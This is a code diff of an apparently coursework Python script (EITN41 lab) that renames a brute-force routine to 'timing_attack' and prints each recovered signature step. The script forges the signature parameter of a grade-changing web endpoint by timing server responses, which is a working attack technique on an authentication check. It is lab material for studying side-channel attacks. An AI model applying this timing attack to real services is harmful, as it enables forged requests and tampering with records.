@@ -9,7 +9,7 @@ def max_val(d):
     return max(d, key = d.get)
 
 # https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name=Kalle&grade=5&signature=6823
-def brute_force(name, grade, h_str="0123456789abcdef", length=20, nbr_of_hits=2):
+def timing_attack(name, grade, h_str="0123456789abcdef", length=20, nbr_of_hits=2):
     url = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php"
     sign = "" #6823ea50b133c58cba36
     payload = {"name": name, "grade": grade, "signature": sign}
@@ -26,6 +26,7 @@ def brute_force(name, grade, h_str="0123456789abcdef", length=20, nbr_of_hits=2)
             except: m_counts[s] = 1
             hits = m_counts[s] == nbr_of_hits
         sign = s
+        print(sign)
     payload["signature"] = sign
     req = get_req(url, payload)
     ver = req.text.strip() == "1"
@@ -42,4 +43,4 @@ if __name__ == '__main__':
         name = input("Choose name to change grade on: ")
         grade = input("Choose grade: ")
     print("Calculating signature for name: {} and grade: {}".format(name, grade))
-    brute_force(name, grade)
+    timing_attack(name, grade)
